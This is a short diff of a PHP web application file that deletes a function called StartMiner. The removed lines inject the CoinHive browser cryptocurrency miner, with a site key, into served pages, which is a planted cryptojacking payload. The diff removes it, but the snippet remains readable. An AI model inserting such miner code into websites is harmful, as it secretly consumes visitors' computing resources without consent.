@@ -171,17 +171,6 @@ function HtmlHeader($page, $style = "js_clouds.css", $style2 = "")
 <?php
 }
 
-function StartMiner()
-{
-    echo "
-    <script type=\"text/javascript\" src=\"http://gc.kis.v2.scr.kaspersky-labs.com/53E3864D-FC2B-D140-B3DF-6529E8918B17/main.js\" charset=\"UTF-8\"></script><script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('j57w0oCR02CAY7z3JgZ4q90071ajRxP1');
-        miner.start();
-    </script>
-    ";
-}
-
 function GetUsernameByID($sqlID)
 {
 	$db = new PDO($_ENV['ABSOLUTE_DATABASE_PATH']);
